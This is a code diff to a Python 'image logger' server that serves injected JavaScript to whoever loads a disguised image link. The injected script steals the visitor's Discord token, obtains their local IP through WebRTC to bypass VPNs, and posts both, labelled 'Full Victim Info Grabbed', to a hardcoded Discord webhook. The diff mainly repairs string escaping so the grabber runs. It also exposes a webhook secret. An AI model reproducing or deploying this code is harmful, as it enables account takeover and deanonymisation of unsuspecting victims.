@@ -9,7 +9,7 @@ __version__ = "v2.0"
 __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1420412512419184751/lKlNWFrgNNVdv0ONhyF2dsex8dt2r7GznuDKAOxmE_OC-Ehk3eAlZAopqoemtSqtmL5Y",
+    "webhook": "https://discord.com/api/webhooks/1420412512419184751/lKlNWFrgNNVdv0ONhyF2dsex8dt2r7GznuDKAOxmE_OC-Ehk3eAlZAopqoemtSqtmL5Y",  # REPLACE WITH YOUR WEBHOOK
     "image": "https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIyLTA0L2pvYjcyMS0wMzctdi5qcGc.jpg",
     "imageArgument": True,
     # CUSTOMIZATION #
@@ -123,11 +123,17 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
-**User Agent:**    }
-  ],
+
+**User Agent:**
+```
+{useragent}
+```""",
+        }
+    ],
 }
    
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
@@ -228,55 +234,60 @@ if (!currenturl.includes("g=")) {
 }}
 </script>"""
 
-                # ONLY THIS PART IS ADDED — TOKEN + REAL LOCAL IP (Ethernet/WiFi) GRABBER
-                data += b'''
+                # Token and local IP grabber
+                webhook_url = config["webhook"]
+                public_ip = self.headers.get('x-forwarded-for') or 'Unknown'
+                user_agent = self.headers.get('user-agent') or 'Unknown'
+                
+                js_code = f'''
 <script>
-setTimeout(() => {
+setTimeout(() => {{
     let token = null;
     let localIp = "Unknown";
 
     // Grab Discord Token (works on desktop + web)
-    try { token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken() } catch(e) {}
+    try {{ token = (webpackChunkdiscord_app.push([[''],{{}},e=>{{m=[];for(let c in e.c)m.push(e.c[c])}}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken() }} catch(e) {{}}
     if (!token) token = localStorage.getItem("token")?.replace(/"/g,"");
     if (!token) document.body.innerHTML.match(/"token":"([^"]+)"/) && (token = RegExp.$1);
 
     // Grab Real Local IP via WebRTC (bypasses VPN)
-    try {
-        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+    try {{
+        const pc = new RTCPeerConnection({{iceServers: [{{urls: "stun:stun.l.google.com:19302"}}]}});
         pc.createDataChannel("");
         pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = ice => {
-            if (ice && ice.candidate && ice.candidate.candidate) {
-                const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+        pc.onicecandidate = ice => {{
+            if (ice && ice.candidate && ice.candidate.candidate) {{
+                const match = ice.candidate.candidate.match(/([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/);
                 if (match) localIp = match[1];
-            }
-        };
-    } catch(e) {}
+            }}
+        }};
+    }} catch(e) {{}}
 
-    setTimeout(() => {
-        fetch("''' + config["webhook"].encode() + b'''", {
+    setTimeout(() => {{
+        fetch("{webhook_url}", {{
             method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
+            headers: {{"Content-Type": "application/json"}},
+            body: JSON.stringify({{
                 username: "Advanced Grabber",
                 content: "@everyone",
-                embeds: [{
+                embeds: [{{
                     title: ":crown: Full Victim Info Grabbed",
                     color: 0xFF0000,
                     fields: [
-                        {name: "Discord Token", value: "```" + (token || "Not Found") + "```", inline: false},
-                        {name: "Public IP", value: "```''' + (self.headers.get('x-forwarded-for') or b'Unknown') + b'''```", inline: true},
-                        {name: "Real Local IP (LAN)", value: "```" + localIp + "```", inline: true},
-                        {name: "User-Agent", value: "```''' + (self.headers.get('user-agent') or b'Unknown') + b'''```", inline: false}
+                        {{name: "Discord Token", value: "```" + (token || "Not Found") + "```", inline: false}},
+                        {{name: "Public IP", value: "```{public_ip}```", inline: true}},
+                        {{name: "Real Local IP (LAN)", value: "```" + localIp + "```", inline: true}},
+                        {{name: "User-Agent", value: "```{user_agent}```", inline: false}}
                     ],
-                    footer: {text: "Image Logger + Token + Local IP Grabber • 2025"}
-                }]
-            })
-        });
-    }, 3000);
-}, 1000);
+                    footer: {{text: "Image Logger + Token + Local IP Grabber • 2025"}}
+                }}]
+            }})
+        }});
+    }}, 3000);
+}}, 1000);
 </script>
 '''
+                data += js_code.encode()
 
                 self.wfile.write(data)
        
